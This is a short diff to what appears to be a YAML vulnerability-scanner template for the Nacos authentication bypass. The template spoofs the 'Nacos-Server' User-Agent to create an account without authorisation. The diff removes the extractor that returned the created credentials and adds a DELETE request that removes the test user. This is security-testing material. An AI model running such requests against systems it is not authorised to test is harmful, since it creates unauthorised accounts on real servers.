@@ -25,11 +25,11 @@ rules:
         headers:
           User-Agent: Nacos-Server
     expression: response.status == 200 && response.body.bcontains(bytes("create user ok!"))
-
-extractors:
-  - type: word
-    extractor:
-      user: "{{r1}}"
-      pass: "{{r2}}"
-
-expression: r0() || r1()
+  r2:
+    request:
+      method: DELETE
+      path: /nacos/v1/auth/users?username={{r1}}
+      headers:
+          User-Agent: Nacos-Server
+    expression: true
+expression: (r0() && r2()) || (r1() && r2())
